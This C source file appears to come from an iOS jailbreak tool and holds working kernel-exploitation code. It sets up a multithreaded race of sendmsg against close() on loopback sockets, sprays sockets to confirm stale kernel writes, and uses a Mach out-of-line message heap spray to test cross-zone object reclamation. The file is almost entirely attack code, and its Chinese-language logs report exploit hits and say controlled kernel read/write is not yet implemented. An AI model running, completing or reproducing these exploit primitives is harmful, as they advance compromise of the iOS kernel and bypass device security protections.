#include "IOSJB-Bridging-Header.h"

#include <arpa/inet.h>
#include <errno.h>
#include <mach/mach.h>
#include <mach/message.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <signal.h>
#include <stdarg.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#define IOSJB_MAX_SENDERS 16
#define IOSJB_MAX_SPRAY 256
#define IOSJB_OOL_PORTS 768
#define IOSJB_OOL_SIZE 832
#define IOSJB_EXHAUST_FDS 1024

extern void iosjb_swift_log(const char *message);

typedef struct {
    pthread_mutex_t mutex;
    pthread_cond_t condition;
    int generation;
    int target_fd;
    int entered;
    int done;
    int senders;
} sender_gate_t;

typedef struct {
    atomic_int stop;
    atomic_int running;
    int mode;
    int iterations;
    int senders;
    int spray_count;
    int close_delay_us;
} run_config_t;

static sender_gate_t g_gate;
static run_config_t g_config;
static pthread_once_t g_once = PTHREAD_ONCE_INIT;
static mach_port_t g_ool_ports[IOSJB_OOL_PORTS];
static int g_ool_count;

static void gate_init(void) {
    pthread_mutex_init(&g_gate.mutex, NULL);
    pthread_cond_init(&g_gate.condition, NULL);
    g_gate.target_fd = -1;
    g_gate.senders = 6;
    atomic_init(&g_config.stop, 0);
    atomic_init(&g_config.running, 0);
}

static void log_message(const char *format, ...) {
    char buffer[2048];
    va_list arguments;
    va_start(arguments, format);
    vsnprintf(buffer, sizeof(buffer), format, arguments);
    va_end(arguments);
    iosjb_swift_log(buffer);
}

static int clamp_int(int value, int minimum, int maximum) {
    if (value < minimum) {
        return minimum;
    }
    if (value > maximum) {
        return maximum;
    }
    return value;
}

static int make_listener(uint16_t *out_port) {
    int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (fd < 0) {
        return -1;
    }

    int yes = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));

    struct sockaddr_in address;
    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = 0;
    address.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    if (bind(fd, (struct sockaddr *)&address, sizeof(address)) != 0 ||
        listen(fd, IOSJB_MAX_SPRAY + 32) != 0) {
        close(fd);
        return -1;
    }

    socklen_t length = sizeof(address);
    if (getsockname(fd, (struct sockaddr *)&address, &length) != 0) {
        close(fd);
        return -1;
    }

    *out_port = ntohs(address.sin_port);
    return fd;
}

static int connect_loopback(uint16_t port) {
    int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (fd < 0) {
        return -1;
    }

    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

    int value = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &value, sizeof(value));

    value = 16384;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &value, sizeof(value));
    setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &value, sizeof(value));

    struct linger linger_option;
    linger_option.l_onoff = 1;
    linger_option.l_linger = 0;
    setsockopt(fd, SOL_SOCKET, SO_LINGER, &linger_option, sizeof(linger_option));

    struct sockaddr_in address;
    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons(port);
    address.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    if (connect(fd, (struct sockaddr *)&address, sizeof(address)) != 0) {
        close(fd);
        return -1;
    }
    return fd;
}

static void *sender_worker(void *context) {
    (void)context;
    int observed_generation = 0;
    uint8_t payload[8192];
    memset(payload, 0x41, sizeof(payload));

    struct iovec vectors[8];
    for (int index = 0; index < 8; index++) {
        vectors[index].iov_base = payload + (index * 1024);
        vectors[index].iov_len = 1024;
    }

    for (;;) {
        pthread_mutex_lock(&g_gate.mutex);
        while (!atomic_load(&g_config.stop) &&
               g_gate.generation == observed_generation) {
            pthread_cond_wait(&g_gate.condition, &g_gate.mutex);
        }
        if (atomic_load(&g_config.stop)) {
            pthread_mutex_unlock(&g_gate.mutex);
            break;
        }

        observed_generation = g_gate.generation;
        int target_fd = g_gate.target_fd;
        g_gate.entered += 1;
        pthread_cond_broadcast(&g_gate.condition);
        pthread_mutex_unlock(&g_gate.mutex);

        if (target_fd >= 0) {
            struct msghdr message;
            memset(&message, 0, sizeof(message));
            message.msg_iov = vectors;
            message.msg_iovlen = 8;
            (void)sendmsg(target_fd, &message, MSG_DONTWAIT | MSG_NOSIGNAL);
        }

        pthread_mutex_lock(&g_gate.mutex);
        g_gate.done += 1;
        pthread_cond_broadcast(&g_gate.condition);
        pthread_mutex_unlock(&g_gate.mutex);
    }
    return NULL;
}

static int wait_for_entered(int expected) {
    struct timespec deadline;
    clock_gettime(CLOCK_REALTIME, &deadline);
    deadline.tv_nsec += 5000000;
    if (deadline.tv_nsec >= 1000000000) {
        deadline.tv_sec += 1;
        deadline.tv_nsec -= 1000000000;
    }

    pthread_mutex_lock(&g_gate.mutex);
    while (g_gate.entered < expected &&
           !atomic_load(&g_config.stop)) {
        if (pthread_cond_timedwait(&g_gate.condition, &g_gate.mutex,
                                   &deadline) == ETIMEDOUT) {
            break;
        }
    }
    int entered = g_gate.entered;
    pthread_mutex_unlock(&g_gate.mutex);
    return entered;
}

static void wait_for_done(int expected) {
    int waited_us = 0;
    while (waited_us < 200000 && !atomic_load(&g_config.stop)) {
        pthread_mutex_lock(&g_gate.mutex);
        int done = g_gate.done;
        pthread_mutex_unlock(&g_gate.mutex);
        if (done >= expected) {
            return;
        }
        usleep(200);
        waited_us += 200;
    }
}

static int peer_bytes(int fd) {
    uint8_t buffer[4096];
    int total = 0;
    for (;;) {
        ssize_t count = recv(fd, buffer, sizeof(buffer), MSG_DONTWAIT);
        if (count > 0) {
            total += (int)count;
            continue;
        }
        break;
    }
    return total;
}

static void close_array(int *fds, int count) {
    for (int index = 0; index < count; index++) {
        if (fds[index] >= 0) {
            close(fds[index]);
            fds[index] = -1;
        }
    }
}

static int run_oracle(int iterations, int senders, int spray_count,
                      int close_delay_us) {
    uint16_t port = 0;
    int listener = make_listener(&port);
    if (listener < 0) {
        log_message("[!] 监听 Socket 创建失败：%s", strerror(errno));
        return -1;
    }

    log_message("[检测] 端口=%u 发送线程=%d 喷射数=%d 迭代=%d",
                port, senders, spray_count, iterations);
    log_message("[检测] 常驻线程门闸已启用，关闭延迟=%d 微秒",
                close_delay_us);

    pthread_t workers[IOSJB_MAX_SENDERS];
    pthread_mutex_lock(&g_gate.mutex);
    g_gate.senders = senders;
    g_gate.entered = 0;
    g_gate.done = 0;
    g_gate.generation = 0;
    g_gate.target_fd = -1;
    pthread_mutex_unlock(&g_gate.mutex);

    for (int index = 0; index < senders; index++) {
        if (pthread_create(&workers[index], NULL, sender_worker, NULL) != 0) {
            log_message("[!] 发送线程 %d 创建失败", index);
            atomic_store(&g_config.stop, 1);
            close(listener);
            return -1;
        }
        pthread_detach(workers[index]);
    }

    int hits = 0;
    int total_stale_bytes = 0;
    int completed = 0;

    for (int iteration = 0; iteration < iterations; iteration++) {
        if (atomic_load(&g_config.stop)) {
            break;
        }

        int target_fd = connect_loopback(port);
        if (target_fd < 0) {
            log_message("[!] 第 %d 轮目标连接失败：%s",
                        iteration, strerror(errno));
            break;
        }

        int target_peer = accept(listener, NULL, NULL);
        if (target_peer < 0) {
            close(target_fd);
            log_message("[!] 第 %d 轮目标 accept 失败：%s",
                        iteration, strerror(errno));
            break;
        }

        pthread_mutex_lock(&g_gate.mutex);
        g_gate.target_fd = target_fd;
        g_gate.entered = 0;
        g_gate.done = 0;
        g_gate.generation += 1;
        pthread_cond_broadcast(&g_gate.condition);
        pthread_mutex_unlock(&g_gate.mutex);

        int entered = wait_for_entered(senders);
        if (entered < senders) {
            log_message("[!] 第 %d 轮只有 %d/%d 个发送线程进入内核",
                        iteration, entered, senders);
        }

        if (close_delay_us > 0) {
            usleep((useconds_t)close_delay_us);
        }

        close(target_fd);

        int spray_fds[IOSJB_MAX_SPRAY];
        int spray_peers[IOSJB_MAX_SPRAY];
        for (int index = 0; index < IOSJB_MAX_SPRAY; index++) {
            spray_fds[index] = -1;
            spray_peers[index] = -1;
        }

        int created = 0;
        for (int index = 0; index < spray_count; index++) {
            int spray_fd = connect_loopback(port);
            if (spray_fd < 0) {
                break;
            }
            int peer = accept(listener, NULL, NULL);
            if (peer < 0) {
                close(spray_fd);
                break;
            }
            spray_fds[created] = spray_fd;
            spray_peers[created] = peer;
            created += 1;
        }

        wait_for_done(senders);
        close(target_peer);
        usleep(1000);

        int iteration_bytes = 0;
        for (int index = 0; index < created; index++) {
            iteration_bytes += peer_bytes(spray_peers[index]);
        }

        if (iteration_bytes > 0) {
            hits += 1;
            total_stale_bytes += iteration_bytes;
            log_message("[!] STALE WRITE CONFIRMED / 已确认陈旧写入：迭代=%d 字节=%d",
                        iteration, iteration_bytes);
        }

        close_array(spray_fds, created);
        close_array(spray_peers, created);

        pthread_mutex_lock(&g_gate.mutex);
        g_gate.target_fd = -1;
        pthread_mutex_unlock(&g_gate.mutex);

        completed = iteration + 1;
        if (iteration % 25 == 0 || iteration_bytes > 0) {
            log_message("[检测] 进度 %d/%d 命中=%d 陈旧字节=%d",
                        completed, iterations, hits, total_stale_bytes);
        }
        if (iteration % 25 == 24) {
            usleep(1000);
        }
    }

    atomic_store(&g_config.stop, 1);
    pthread_mutex_lock(&g_gate.mutex);
    pthread_cond_broadcast(&g_gate.condition);
    pthread_mutex_unlock(&g_gate.mutex);
    close(listener);

    log_message("[检测] 完成：尝试=%d 命中=%d 陈旧字节=%d",
                completed, hits, total_stale_bytes);
    if (hits == 0) {
        log_message("[检测] 未观察到陈旧数据投递，不能据此判断设备安全");
    } else {
        log_message("[检测] 已观察到内核 stale write；受控内核读写尚未实现");
    }
    return hits;
}

static int ool_spray(uint64_t fill, int count) {
    uint8_t *buffer = malloc(IOSJB_OOL_SIZE);
    if (buffer == NULL) {
        return 0;
    }
    for (size_t offset = 0; offset < IOSJB_OOL_SIZE; offset += 8) {
        memcpy(buffer + offset, &fill, sizeof(fill));
    }

    g_ool_count = 0;
    for (int index = 0; index < count && index < IOSJB_OOL_PORTS; index++) {
        mach_port_t port = MACH_PORT_NULL;
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
                               &port) != KERN_SUCCESS) {
            break;
        }
        if (mach_port_insert_right(mach_task_self(), port, port,
                                   MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(mach_task_self(), port);
            break;
        }

        struct {
            mach_msg_header_t header;
            mach_msg_body_t body;
            mach_msg_ool_descriptor_t descriptor;
        } message;
        memset(&message, 0, sizeof(message));
        message.header.msgh_bits =
            MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) |
            MACH_MSGH_BITS_COMPLEX;
        message.header.msgh_size = sizeof(message);
        message.header.msgh_remote_port = port;
        message.header.msgh_local_port = MACH_PORT_NULL;
        message.header.msgh_id = 0x494f534a;
        message.body.msgh_descriptor_count = 1;
        message.descriptor.address = buffer;
        message.descriptor.size = IOSJB_OOL_SIZE;
        message.descriptor.deallocate = 0;
        message.descriptor.copy = MACH_MSG_VIRTUAL_COPY;
        message.descriptor.type = MACH_MSG_OOL_DESCRIPTOR;

        if (mach_msg(&message.header, MACH_SEND_MSG, sizeof(message), 0,
                     MACH_PORT_NULL, 0, MACH_PORT_NULL) != KERN_SUCCESS) {
            mach_port_deallocate(mach_task_self(), port);
            break;
        }
        g_ool_ports[g_ool_count] = port;
        g_ool_count += 1;
    }

    free(buffer);
    return g_ool_count;
}

static void ool_cleanup(void) {
    for (int index = 0; index < g_ool_count; index++) {
        if (g_ool_ports[index] != MACH_PORT_NULL) {
            (void)mach_port_mod_refs(mach_task_self(), g_ool_ports[index],
                                     MACH_PORT_RIGHT_RECEIVE, -1);
            (void)mach_port_deallocate(mach_task_self(), g_ool_ports[index]);
            g_ool_ports[index] = MACH_PORT_NULL;
        }
    }
    g_ool_count = 0;
}

static int run_reclaim_probe(void) {
    int fds[IOSJB_EXHAUST_FDS];
    for (int index = 0; index < IOSJB_EXHAUST_FDS; index++) {
        fds[index] = -1;
    }

    int created = 0;
    for (int index = 0; index < IOSJB_EXHAUST_FDS; index++) {
        if (atomic_load(&g_config.stop)) {
            break;
        }
        int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (fd < 0) {
            break;
        }
        fds[index] = fd;
        created += 1;
    }

    log_message("[回收] 已分配 %d 个 Socket 对象", created);
    for (int index = 0; index < created; index++) {
        close(fds[index]);
        fds[index] = -1;
    }
    usleep(50000);

    int sprayed = ool_spray(0x4141414141414141ULL, 512);
    log_message("[回收] 已喷射 %d 个 %d 字节的 OOL 对象",
                sprayed, IOSJB_OOL_SIZE);
    usleep(25000);

    int hits = 0;
    int probes[64];
    for (int index = 0; index < 64; index++) {
        probes[index] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    }

    for (int index = 0; index < 64; index++) {
        if (probes[index] < 0) {
            continue;
        }
        int value = 0;
        socklen_t length = sizeof(value);
        if (getsockopt(probes[index], SOL_SOCKET, SO_SNDBUF,
                       &value, &length) == 0 && value == 0x41414141) {
            hits += 1;
        }
        value = 0;
        length = sizeof(value);
        if (getsockopt(probes[index], SOL_SOCKET, SO_RCVBUF,
                       &value, &length) == 0 && value == 0x41414141) {
            hits += 1;
        }
    }
    close_array(probes, 64);
    ool_cleanup();

    log_message("[回收] 标记命中=%d（0 表示未观察到跨 Zone 复用）", hits);
    log_message("[回收] 此探针不会触发 Socket UAF 竞态");
    return hits;
}

static void *run_worker(void *context) {
    (void)context;
    int result = -1;
    if (g_config.mode == IOSJB_MODE_ORACLE) {
        result = run_oracle(g_config.iterations,
                            g_config.senders,
                            g_config.spray_count,
                            g_config.close_delay_us);
    } else if (g_config.mode == IOSJB_MODE_RECLAIM) {
        result = run_reclaim_probe();
    } else {
        log_message("[!] 未知模式 %d", g_config.mode);
    }

    log_message("[+] 工作线程结束，结果=%d", result);
    atomic_store(&g_config.running, 0);
    return NULL;
}

int32_t iosjb_start(int32_t mode,
                    int32_t iterations,
                    int32_t senders,
                    int32_t spray_count,
                    int32_t close_delay_us) {
    pthread_once(&g_once, gate_init);
    signal(SIGPIPE, SIG_IGN);

    if (atomic_load(&g_config.running)) {
        log_message("[!] 已有探针正在运行");
        return -1;
    }
    if (mode != IOSJB_MODE_ORACLE && mode != IOSJB_MODE_RECLAIM) {
        return -1;
    }

    g_config.mode = mode;
    g_config.iterations = clamp_int(iterations, 1, 10000);
    g_config.senders = clamp_int(senders, 1, IOSJB_MAX_SENDERS);
    g_config.spray_count = clamp_int(spray_count, 1, IOSJB_MAX_SPRAY);
    g_config.close_delay_us = clamp_int(close_delay_us, 0, 5000);
    atomic_store(&g_config.stop, 0);
    atomic_store(&g_config.running, 1);

    pthread_t worker;
    if (pthread_create(&worker, NULL, run_worker, NULL) != 0) {
        atomic_store(&g_config.running, 0);
        log_message("[!] 工作线程创建失败");
        return -1;
    }
    pthread_detach(worker);
    return 0;
}

void iosjb_stop(void) {
    atomic_store(&g_config.stop, 1);
    pthread_mutex_lock(&g_gate.mutex);
    pthread_cond_broadcast(&g_gate.condition);
    pthread_mutex_unlock(&g_gate.mutex);
    log_message("[*] 已请求停止");
}

int32_t iosjb_is_running(void) {
    return atomic_load(&g_config.running) ? 1 : 0;
}

const char *iosjb_version(void) {
    return "0.1.1";
}

